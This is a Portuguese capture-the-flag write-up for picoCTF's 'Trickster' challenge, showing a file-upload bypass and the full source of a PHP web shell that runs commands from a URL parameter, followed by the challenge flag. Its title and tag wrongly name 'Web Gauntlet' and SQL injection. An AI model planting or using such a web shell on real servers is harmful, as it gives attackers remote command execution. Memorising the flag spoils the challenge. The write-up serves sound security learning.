# DuckWare Team - Web Gauntlet (picoCTF 2024)
###### Solved by @xpics and @JoaoPedroPiceli
>This CTF is about SQL Injection, Web exploitation

# Desafio: Exploração Web

## Introdução

Este desafio explora vulnerabilidades em aplicações web, exigindo uma abordagem metódica para encontrar e explorar falhas.

- **Página do Desafio:** [Link do Desafio](https://play.picoctf.org/practice/challenge/445)

## Descrição do Desafio

O desafio Trickster do picoCTF 2024 requer análise de páginas web, inspeção de código-fonte e exploração de possíveis falhas na aplicação para encontrar a flag escondida.

## Estratégia de Solução

### Análise Inicial

- **Leitura da Descrição:** Ao entrar na página inicial, encontramos uma funcionalidade que permite o upload de imagens. Isso sugere a possibilidade de explorar o upload de arquivos maliciosos, um vetor de ataque comum em desafios anteriores do time.

[![Captura de Tela](https://i.postimg.cc/Pr136t5q/Captura-de-tela-2025-02-13-194158.png)](https://postimg.cc/cr4BCGYq)

### Explorando o Upload de Arquivos

A abordagem utilizada foi criar um arquivo com código malicioso e tentar fazer o upload mascarando sua extensão. Para isso, utilizamos um arquivo `.php` disfarçado de imagem, nomeado como `png.php`. Esse arquivo contém um **web shell**, permitindo a execução remota de comandos no servidor.

### Código Malicioso Utilizado

```php
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

Esse código cria uma interface simples onde podemos inserir comandos no campo de texto e executá-los diretamente no servidor.

## Recuperando a Bandeira

Após realizar o upload do arquivo, acessamos a URL: [http://atlas.picoctf.net:59959/uploads/nomedoarquivo.png.php](http://atlas.picoctf.net:59959/uploads/nomedoarquivo.png.php)

[![Captura de Tela](https://i.postimg.cc/Qd4pmP1t/Captura-de-tela-2.png)](https://postimg.cc/v4ngH0PF)

Agora, com acesso ao terminal via web shell, podemos utilizar os seguintes comandos para listar os arquivos disponíveis:

[![Comandos](https://i.postimg.cc/k5Rtc571/aaaa.png)](https://postimg.cc/94VMXCRZ)

Após executar esse comando, obtemos a listagem de todas as pastas e arquivos disponíveis. O próximo passo é explorar esses arquivos para encontrar a flag.

[![captura-de-todos-os-arquivos-txt.png](https://i.postimg.cc/VkpJdcXj/captura-de-todos-os-arquivos-txt.png)](https://postimg.cc/PCbXR93x)

## Passos Finais

Entre os arquivos listados, um dos que mais chamam a atenção é: `/var/www/html/HFQWKODGMIYTO.txt`. Utilizando o comando `cat` para visualizar seu conteúdo, encontramos a seguinte informação:

[![flag.png](https://i.postimg.cc/15zXBzHG/flag.png)](https://postimg.cc/RqjvV42h)

Ao analisarmos atentamente, verificamos que esse arquivo contém a flag do desafio.

## Flag:

**picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17}**
